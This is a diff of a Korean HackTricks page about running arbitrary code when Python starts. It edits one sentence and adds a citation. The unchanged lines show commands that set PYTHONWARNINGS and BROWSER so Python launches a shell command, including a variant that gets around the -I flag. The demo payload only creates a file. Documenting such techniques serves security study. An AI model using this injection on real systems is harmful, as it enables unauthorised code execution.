@@ -4,7 +4,7 @@
 
 ## `PYTHONWARNINGS` 및 `BROWSER` 환경 변수를 통한 방법
 
-두 환경 변수를 변경하여 python이 호출될 때마다 임의의 코드를 실행할 수 있습니다. 예를 들어:
+두 환경 변수를 모두 변경하여 python이 호출될 때마다 arbitrary code를 실행할 수 있습니다. 예를 들면 다음과 같습니다:<sup>[[1]](#references)</sup>
 ```bash
 # Generate example python script
 echo "print('hi')" > /tmp/script.py
@@ -15,4 +15,8 @@ PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktri
 # RCE which will generate file /tmp/hacktricks bypassing "-I" injecting "-W" before the script to execute
 BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
 ```
+## 참고 문헌
+
+- [1] [환경 변수를 사용한 Hacking - elttam](https://www.elttam.com/blog/env/)
+
 {{#include ../../../banners/hacktricks-training.md}}
